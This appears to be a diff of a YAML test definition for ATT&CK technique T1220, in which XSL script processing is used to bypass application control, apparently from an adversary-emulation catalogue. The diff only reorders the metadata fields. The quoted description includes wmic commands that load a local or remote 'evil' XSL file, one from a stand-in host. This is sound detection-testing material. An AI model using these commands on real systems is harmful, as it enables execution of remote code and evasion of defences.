@@ -1,18 +1,3 @@
-guid: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
-name: MSXSL Bypass using remote files
-tactic:
-  - defense-evasion
-technique:
-  - T1220
-sigma: false
-sigma_rule: []
-os:
-  - windows
-description: |
-  Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
-  Requires download of MSXSL.exe. No longer available from Microsoft.
-  (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
-  Open Calculator.exe when test successfully executed, while AV turned off.
 Attack_name: XSL Script Processing
 Attack_description: |-
   Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)
@@ -31,3 +16,18 @@ Attack_description: |-
 
   * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
   * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
+guid: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
+name: MSXSL Bypass using remote files
+tactic:
+  - defense-evasion
+technique:
+  - T1220
+os:
+  - windows
+description: |
+  Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
+  Requires download of MSXSL.exe. No longer available from Microsoft.
+  (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
+  Open Calculator.exe when test successfully executed, while AV turned off.
+sigma: false
+sigma_rule: []
